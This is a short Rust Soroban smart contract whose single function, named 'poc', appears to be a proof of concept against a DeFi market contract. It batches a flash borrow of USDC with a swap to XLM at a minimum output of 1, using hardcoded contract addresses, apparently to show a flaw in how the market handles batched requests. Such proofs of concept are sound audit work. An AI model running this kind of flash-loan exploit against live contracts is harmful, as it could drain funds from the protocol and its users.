#![no_std]

use soroban_sdk::{Address, Env, contract, contractimpl};

use crate::market::{Request, StandardRequest, SwapExactTokensRequest};

mod market {
    use soroban_sdk::contractimport;

    contractimport!(file = "../../wasms/deploy/market.wasm");
}

#[contract]
pub struct Contract;

#[contractimpl]
impl Contract {
    pub fn poc(e: Env, user: &Address) {
        let market_address: Address =
            Address::from_str(&e, "CDKKJYAG6TLTCBXK77ZUZLSJ2VNJ65B4WL7NFMH4KNKS2WRKXXT4Y7IB");
        let xlm_address: Address =
            Address::from_str(&e, "CDLZFC3SYJYDZT7K67VZ75HPJVIEUVNIXF47ZG2FB2RMQQVU2HHGCYSC");
        let usdc_address: Address =
            Address::from_str(&e, "CBIELTK6YBZJU5UP2WWQEUCYKLPU6AUNZ2BQ4WWFEIE3USCIHMXQDAMA");

        user.require_auth();

        let market_client = market::Client::new(&e, &market_address);

        let flash_borrow_request = Request::FlashBorrow(StandardRequest {
            amount: 10_000,
            pool_address: usdc_address.clone(),
        });
        let swap_request = Request::SwapExactTokens(SwapExactTokensRequest {
            user: user.clone(),
            token_in: usdc_address,
            token_out: xlm_address,
            amount_in: 10_000,
            min_amount_out: 1,
        });

        let requests = soroban_sdk::vec![&e, flash_borrow_request, swap_request];

        market_client.submit_requests_batch(&user, &None, &requests, &None);
    }
}
